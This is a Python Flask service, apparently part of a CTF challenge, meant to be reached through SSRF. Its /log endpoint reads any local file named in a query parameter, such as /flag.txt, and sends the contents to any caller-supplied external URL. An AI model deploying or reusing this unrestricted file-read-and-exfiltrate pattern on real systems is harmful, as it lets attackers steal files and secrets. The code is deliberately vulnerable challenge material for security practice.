#!/usr/bin/env python3
"""
internal-logger — Internal exfiltration service for el camel CTF.
Hostname: internal-logger.local (internal network only)
Endpoint: GET /log?file=[PATH]&dest=[EXTERNAL_URL]

Reads a local file and sends its content to an attacker-controlled URL.
This is the target service that participants must reach via SSRF.
"""

import os
import logging
import urllib.parse
import urllib.request

from flask import Flask, request, jsonify

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("internal-logger")

FLAG_PATH = "/flag.txt"
FLAG_CONTENT = os.environ.get("FLAG", "ctf{el_camel_bypass_successful}")

# Ensure the flag file exists with proper content
os.makedirs(os.path.dirname(FLAG_PATH), exist_ok=True)
with open(FLAG_PATH, "w") as f:
    f.write(FLAG_CONTENT)
logger.info(f"Flag written to {FLAG_PATH} (len={len(FLAG_CONTENT)})")


@app.route("/log", methods=["GET", "POST"])
def log_endpoint():
    """
    The exfiltration endpoint.
    
    Query Parameters:
      file (required) — Path to local file to read (e.g., /flag.txt)
      dest (required) — External URL to exfiltrate content to
      method (optional) — HTTP method for exfiltration: GET or POST (default: POST)
    
    The service reads the file and sends its contents to the destination URL.
    """
    file_path = request.args.get("file")
    dest_url = request.args.get("dest")
    method = request.args.get("method", "POST").upper()

    if not file_path:
        return jsonify({"status": "error", "msg": "Missing 'file' parameter"}), 400
    if not dest_url:
        return jsonify({"status": "error", "msg": "Missing 'dest' parameter"}), 400

    logger.info(f"Log request: file={file_path}, dest={dest_url[:100]}, method={method}")

    # Read the file
    try:
        with open(file_path, "r") as f:
            content = f.read()
        logger.info(f"Successfully read {len(content)} bytes from {file_path}")
    except FileNotFoundError:
        logger.error(f"File not found: {file_path}")
        return jsonify({"status": "error", "msg": f"File not found: {file_path}"}), 404
    except PermissionError:
        logger.error(f"Permission denied: {file_path}")
        return jsonify({"status": "error", "msg": "Permission denied"}), 403
    except Exception as e:
        logger.error(f"Error reading file {file_path}: {e}")
        return jsonify({"status": "error", "msg": f"Read error: {str(e)}"}), 500

    # Exfiltrate to destination
    exfil_success = False
    try:
        data = urllib.parse.urlencode({"content": content, "file": file_path})
        data_bytes = data.encode("utf-8")

        if method == "GET":
            # Append content as query parameter
            separator = "&" if "?" in dest_url else "?"
            full_url = f"{dest_url}{separator}{data}"
            logger.info(f"Exfiltrating via GET to: {full_url[:120]}")
            req = urllib.request.Request(full_url, method="GET")
            with urllib.request.urlopen(req, timeout=10) as resp:
                logger.info(f"Exfiltration GET response: HTTP {resp.status}")
                exfil_success = True
        else:
            # POST — send content in body
            logger.info(f"Exfiltrating via POST to: {dest_url[:120]}")
            req = urllib.request.Request(dest_url, data=data_bytes, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=10) as resp:
                logger.info(f"Exfiltration POST response: HTTP {resp.status}")
                exfil_success = True

    except urllib.error.URLError as e:
        logger.error(f"Exfiltration URL error: {e.reason}")
    except Exception as e:
        logger.error(f"Exfiltration error: {e}")

    if exfil_success:
        return jsonify({"status": "ok", "msg": f"Logged {len(content)} bytes from {file_path}"})
    else:
        return jsonify({"status": "partial", "msg": f"File read ({len(content)} bytes) but exfiltration may have failed."})


@app.route("/health")
def health():
    """Simple health check."""
    return jsonify({"status": "healthy", "service": "internal-logger"})


@app.route("/")
def index():
    return jsonify({
        "service": "internal-logger",
        "version": "1.0.0",
        "endpoints": {
            "/log": "GET/POST ?file=PATH&dest=URL&method=GET|POST",
            "/health": "GET"
        }
    })


if __name__ == "__main__":
    logger.info("internal-logger service starting on port 8080...")
    app.run(host="0.0.0.0", port=8080, debug=False)
